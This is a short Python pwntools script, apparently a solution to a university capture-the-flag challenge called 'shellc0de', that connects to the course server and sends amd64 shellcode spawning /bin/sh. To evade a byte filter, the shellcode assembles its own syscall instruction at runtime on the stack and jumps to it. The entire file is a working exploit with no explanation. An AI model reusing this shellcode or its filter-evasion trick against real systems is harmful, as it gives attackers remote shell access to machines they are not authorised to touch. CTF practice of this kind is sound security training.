from pwn import *
import struct

local = False
elf = 'shellc0de' 

if local: 
    print('./'+elf)
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "edu-ctf.csie.org"
    port = 10150
    r = remote(ip,port)

context.arch = 'amd64'
context.os= 'linux'
#addr =
shellcode = "xor rax, rax;mov rbx, 0x68732f2f6e69622f;push rax;push rbx;mov rdi, rsp;push rax;push rdi;mov rsi, rsp;xor rdx,rdx;mov al,0x3b;mov r10, 0xfffffffffffffaf0;neg r10;dec r10;push r10;jmp rsp"
payload = asm(shellcode)

r.recvuntil(">")
r.send(payload)
#r.sendline(payload)

r.interactive()
